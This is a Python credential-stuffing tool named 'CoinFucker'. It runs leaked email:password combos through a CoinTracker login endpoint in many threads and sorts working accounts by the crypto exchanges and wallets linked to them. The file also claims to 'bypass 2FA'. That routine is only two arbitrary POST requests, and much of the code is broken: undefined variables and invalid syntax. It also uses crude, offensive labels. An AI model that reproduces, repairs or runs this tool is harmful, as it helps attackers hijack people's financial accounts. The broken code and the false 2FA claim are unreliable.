import requests
import random
import threading
import os
import time
import sys
import json
from re import search
from colorama import Fore, Back, Style
from time import gmtime, strftime
import cfscraper
import clistyling

time1 = strftime("%Y-%m-%d-%H-%M-%S", gmtime())
global emails
global passwords
emails = []
passwords = []
combolist = []
proxylist=[]
error=0
bad=0
good=0
cpm=0
cpm1=0
checked=0
banned=0
premium=0
free=0
num=0
clear = lambda: os.system('cls')
os.system("title CoinFucker - 2FA Capturing Cointracker Checker")
open("proxies.txt", "a")
open("combos.txt", "a")

if not os.path.exists(f"results/CoinTracker/{time1}/"):
    os.makedirs(f"results/CoinTracker/{time1}/")
mesaje = ["CoinFucker on top", "CoinFucker #1",]
logo = """
   ______   ___  _____ ____  _____ ________ _____  _____  ______ ___  ____  ________ _______     
 .' ___  |.'   `|_   _|_   \|_   _|_   __  |_   _||_   _.' ___  |_  ||_  _||_   __  |_   __ \    
/ .'   \_/  .-.  \| |   |   \ | |   | |_ \_| | |    | |/ .'   \_| | |_/ /    | |_ \_| | |__) |   
| |      | |   | || |   | |\ \| |   |  _|    | '    ' || |        |  __'.    |  _| _  |  __ /    
\ `.___.'\  `-'  _| |_ _| |_\   |_ _| |_      \ \__/ / \ `.___.'\_| |  \ \_ _| |__/ |_| |  \ \_  
 `.____ .'`.___.|_____|_____|\____|_____|      `.__.'   `.____ .|____||____|________|____| |___| 
                    CoinFucker - 2FA Capturing Cointracker Checker"""


def load_accounts():
    with open('combos.txt','r', encoding='utf8') as f:
        for x in f.readlines():
            emails.append(x.split(":")[0].replace('\n',''))
            passwords.append(x.split(":")[1].replace("\n",''))

with open("proxies.txt", 'r', encoding="utf-8", errors='ignore') as n:
    proxypath = n.readlines()
    for lin_proxy in proxypath:
        lin_prox = lin_proxy.split()[0]
        proxylist.append(linie_prox)
    
def ecran():
    global cpm,cpm1,error,good,bad,checked,premium,free,Epic_Games
    cpm1=cpm
    cpm=0
    clear()
    print()
    print(logo)
    print(f"Checked: {checked}/{len(emails)}")
    print(f"[{good}]Good")
    print(f"[{bad}]Bad")
    print(f"[{error}]Errors")
    print(f"[{cpm1*60}]CPM")


    time.sleep(1)
    threading.Thread(target=ecran, args=(),).start()


def menu():
    clear()
    print()
    print(logo)
    print()
    print()
    print("Welcome to CoinFucker..")
    print("[1] Check CoinTracker's")
    print("[2] Quit")
    alegere_menu = input("=>")
    if alegere_menu == "1":
        print()
    elif alegere_menu == "2":
        print("We are closing..")
        time.sleep(3)
        sys.exit()
    else:
        print("Invalid input..")
        time.sleep(2)
        menu()
def checker(email, password, proxylist):
    global error, good, bad, cpm, checked, banned, premium, free, Epic_Games
    try:
        with requests.Session() as sess:
            content = {
                "service": "mail",
                "gdpr": "false",
                "username": email,
                "password": password,
            }

            headers = {
                "Content-Type": "text/html; charset=utf-8",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip, deflate, br",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            }

            sess = requests.session()
            r = sess.post("https://ios.cointracker.io/u/login/identifier", data=content, headers=headers)

            if "Something went wrong, please try again later" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open(f"results/CoinTracker/{time1}/bad.txt", "a").write(f"{email}:{password}\n")
            if "Something went wrong, please try again later" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open(f"results/CoinTracker/{time1}/bad.txt", "a").write(f"{email}:{password}\n")
            if "Receive Text" in r.text:
                #bypass 2FA
                print("Your DB is raped, Bypassing 2fa...")
                r1.receivet = sess.post("https://ios.cointracker.io/tax_loss_harvesting#Lf558325a-2513-9bf1-abf1-79b8fa628f", cookies=r.cookies, headers=headers)
                r2.receivet = sess.post("https://ios.cointracker.io/wallets", cookies=r2.receivet.cookies, headers=headers)
                cpm+1
                checked+=1
                r2
                open(f"results/CoinTracker/{time1}/bad.txt", "a").write(f"{email}:{password}\n")
            elif "url" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open(f"results/CoinTracker/{time1}/Valids_NoCapture.txt", "a").write(f"{email}:{password}\n")
            r2 = sess.post("https://ios.cointracker.io/wallets", cookies=cookies, headers=headers)
            Capture (
            elif 'Coinbase' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"Coinbase"+("r.text+balance")")
            elif 'Coinbase Pro' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"Coinbase Pro"+("r.text+balance")")
            elif 'FTX' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"FTX"+("r.text+balance")")
            elif 'Etoro' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"Etoro"+("r.text+balance")")
            elif 'Binance' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"Binance"+("r.text+balance")")
            elif 'NiceHash' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"NiceHash"+("r.text+balance")")
            elif 'KuCoin' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"KuCoin"+("r.text+balance")")
            elif 'CoinJar' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"CoinJar"+("r.text+balance")")
            elif 'Casa' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"Casa"+("r.text+balance")")
            elif 'ledger' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"Ledger"+"lgbt activist"+("r.text+balance")")
            elif 'trezor' in r2.text:
            open(f"results/CoinTracker/{time1}/Valids_Capture.txt", "a").write(f"{email}:{password}+"Trezor"+"lgbt activist"+("r.text+balance")")
            )
    except Exception:
        error+=1
        pass    
load_accounts()
menu()

if "main" == "main":
    ecran()
    num = 0
    while 1:
        if threading.active_count() < 20:
            if len(emails) > num:
                threading.Thread(target=checker, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1